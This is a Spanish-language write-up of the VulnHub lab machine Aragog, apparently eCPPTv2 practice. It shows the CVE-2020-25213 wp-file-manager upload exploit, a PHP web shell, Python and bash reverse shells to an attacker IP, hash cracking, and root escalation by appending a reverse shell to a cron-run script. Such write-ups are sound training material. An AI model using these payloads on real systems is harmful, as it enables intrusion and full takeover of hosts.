# Aragog

Write-up de la máquina aragog de la plataforma [vulnhub](https://www.vulnhub.com) (en un ejercicio de laboratorio para eCPPTv2).

![Aragog cover](images/cover.jpg)

## Tabla de Contenido <!-- omit from toc -->

- [Introducción](#introducción)
  - [Técnicas vistas / Tags](#técnicas-vistas--tags)
  - [Estadísticas](#estadísticas)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de host](#escaneo-de-host)
    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
    - [Escaneo específico](#escaneo-específico)
- [Enumeración](#enumeración)
  - [Servicios](#servicios)
    - [http - 80](#http---80)
- [Explotación](#explotación)
    - [Pasos previos | Preparación](#pasos-previos--preparación)
    - [Ejecución](#ejecución)
- [Post Explotación](#post-explotación)
  - [Enumeración](#enumeración-1)
  - [Escalación de privilegios](#escalación-de-privilegios)
    - [www-data → hagrid98](#www-data--hagrid98)
    - [hagrid98 → root](#hagrid98--root)
- [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- Wordpress plugin wp-file-manager exploit.
- CVE-2020-25213.
- Abuso de cronjob.

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Aragog](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/) |
| OS | Linux |
| Dificultad asignada | Fácil |
| Creadores | [Mansoor R](https://www.vulnhub.com/author/mansoor-r,794/) |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -sS --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:16 EST
Initiating ARP Ping Scan at 22:16
Scanning 192.168.111.175 [1 port]
Completed ARP Ping Scan at 22:16, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:16
Scanning 192.168.111.175 [65535 ports]
Discovered open port 80/tcp on 192.168.111.175
Discovered open port 22/tcp on 192.168.111.175
Completed SYN Stealth Scan at 22:16, 1.09s elapsed (65535 total ports)
Nmap scan report for 192.168.111.175
Host is up (0.000046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:18:3F:A9 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 80,22 -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:16 EST
Nmap scan report for 192.168.111.175
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
```

## Enumeración

### Servicios

#### http - 80

Después de la ejecución de `ffuf` se identificó la ruta `/blog`, al navegarla se visualizó  que se trataba de un sitio en Wordpress. Por lo que posteriormente se ejecutó `wpscan` para enumerar el sitio.

```bash
└─$ wpscan --url http://192.168.111.175/blog/ --force --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.111.175/blog/ [192.168.111.175]
[+] Started: Mon Mar  6 09:29:19 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.111.175/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.111.175/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.111.175/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-14).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.111.175/blog/, Match: '-release.min.js?ver=5.0.12'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.111.175/blog/, Match: 'WordPress 5.0.12'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:06 <=======================================================================> (102457 / 102457) 100.00% Time: 00:01:06
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.111.175/blog/wp-content/plugins/akismet/
 | Latest Version: 5.0.2
 | Last Updated: 2022-12-01T17:18:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.111.175/blog/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] wp-file-manager
 | Location: http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/
 | Last Updated: 2023-02-08T10:32:00.000Z
 | Readme: http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 7.1.8
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/, status: 200
 |
 | Version: 6.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <==============================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar  6 09:30:39 2023
[+] Requests Done: 102637
[+] Cached Requests: 8
[+] Data Sent: 28.722 MB
[+] Data Received: 26.056 MB
[+] Memory used: 383.711 MB
[+] Elapsed time: 00:01:20
```

Dada la información recopilada se buscaron vulnerabilidades de los plugins identificados encontrado el CVE-2020-25213 en `wp-file-manager`.

## Explotación

#### Pasos previos | Preparación

Se encontró un [exploit público](https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh) para validar la vulnerabilidad y explotarla. Previamente preparando el siguiente código en php para ejecutar comandos en la máquina, dado que la vulnerabilidad permite subir archivos.

```php
<?php system($_GET["cmd"]);?>
```

#### Ejecución

```bash
└─$ bash exp.sh --wp_url http://192.168.111.175/blog -f $(pwd)/evil.php --verbose

============================================================================================
wp-file-manager wordpress plugin Unauthenticated RCE Exploit    By: Mansoor R (@time4ster)
============================================================================================

curl POC :
curl -ks --max-time 5 --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36" -F "reqid=17457a1fe6959" -F "cmd=upload" -F "target=l1_Lw"  -F "mtime[]=1576045135" -F "upload[]=@//home/srrequiem/Documents/ecpptv2_lab/1_aragog/exploits/evil.php" "http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

[+] W00t! W00t! File uploaded successfully.
Location:  /blog/wp-content/plugins/wp-file-manager/lib/php/../files/evil.php
```

Accediendo a la url por medio de la url `http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/files/evil.php` permitiendo entablar una reverse shell con:

```text
http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/files/evil.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.111.162%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```

## Post Explotación

### Enumeración

Posteriormente, al intentar acceder a la base de datos disponible con las credenciales dentro de `/usr/share/wordpress/wp-config.php` y fallar, se intentó con las que se encuentran de ejemplo en los sitios de wordpress `/etc/wordpress/config-default.php`.

```bash
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
```

Obteniendo así acceso a la base de datos y pudiendo visualizar la lista de usuarios y hashes que se encuentran registrados en wordpress, coincidiendo en que el usuario `hagrid98` es también usuario de sistema.

```bash
MariaDB [wordpress]> select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. |
+------------+------------------------------------+
1 row in set (0.001 sec)
```

### Escalación de privilegios

#### www-data &rarr; hagrid98

Al obtener el hash de la contraseña se hizo uso de `john` para crackearla y poder escalar como ese usuario.

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hagrid98.hash
Created directory: /home/srrequiem/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2023-03-06 12:59) 25.00g/s 38400p/s 38400c/s 38400C/s 753951..mexico1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Permitiendo el logueo con este usuario y acceso al primer horrocrux.

```bash
hagrid98@Aragog:~$ cat horcrux1.txt
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
hagrid98@Aragog:~$ echo 'MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==' | base64 -d && echo
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```

#### hagrid98 &rarr; root

Como parte de la enumeración se encontró dentro de `/opt` un archivo `.sh` que realiza una copia a la carpeta `/tmp`, lo cuál dado que se puede modificar con el usuario obtenido, se puede posteriormente corroborar si está siendo ejecutado de alguna manera.

```bash
hagrid98@Aragog:~$ ls -la /opt/
total 12
drwxr-xr-x  2 root     root     4096 Apr  1  2021 .
drwxr-xr-x 18 root     root     4096 Mar 31  2021 ..
-rwxr-xr-x  1 hagrid98 hagrid98  132 Feb  6 10:23 .backup.sh
hagrid98@Aragog:~$ cat /opt/.backup.sh
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
/bin/bash -i >& /dev/tcp/192.168.111.162/4321 0>&1
```

Para corroborar si el script está siendo ejecutado se ejecutó [pspy](https://github.com/DominicBreuker/pspy), identificando así que está siendo ejecutado por el usuario `root`. Bastaría con añadir el comando que se desee (como una reverse shell) para escalar al usuario `root`.

```bash
2023/03/07 04:03:10 CMD: UID=0    PID=1      | /sbin/init
2023/03/07 04:04:01 CMD: UID=0    PID=2367   | /usr/sbin/CRON -f
2023/03/07 04:04:01 CMD: UID=0    PID=2368   | /usr/sbin/CRON -f
2023/03/07 04:04:01 CMD: UID=0    PID=2369   | /bin/sh -c bash -c "/opt/.backup.sh"
2023/03/07 04:04:01 CMD: UID=0    PID=2370   | /bin/bash /opt/.backup.sh
```

Ejecutando por ejemplo:

```bash
hagrid98@Aragog:~$ echo 'bash -i >& /dev/tcp/192.168.111.162/443 0>&1' >> /opt/.backup.sh && cat /opt/.backup.sh
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
bash -i >& /dev/tcp/192.168.111.162/443 0>&1
```

Permitiendo establecer una conexión y el segundo horrocrux.

```bash
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.111.162] from (UNKNOWN) [192.168.111.175] 45738
bash: cannot set terminal process group (2516): Inappropriate ioctl for device
bash: no job control in this shell
root@Aragog:~# ls -la
ls -la
total 40
drwx------  5 root root     4096 Feb  6 10:31 .
drwxr-xr-x 18 root root     4096 Mar 31  2021 ..
-rw-------  1 root root      802 Feb  7 08:29 .bash_history
-rw-r--r--  1 root root      570 Jan 31  2010 .bashrc
drwx------  3 root root     4096 Mar 31  2021 .gnupg
-rw-r--r--  1 root hagrid98  818 Apr  1  2021 horcrux2.txt
drwxr-xr-x  3 root root     4096 Feb  6 02:02 .local
-rw-r--r--  1 root root      148 Aug 17  2015 .profile
-rw-r--r--  1 root root       74 Mar 31  2021 .selected_editor
drwx------  2 root root     4096 Feb  6 10:26 .ssh
root@Aragog:~# cat horcrux2.txt
cat horcrux2.txt
  ____                            _         _       _   _
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
```

## Referencias

- [Exploit CVE-2020-25213](https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh).
- [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy).
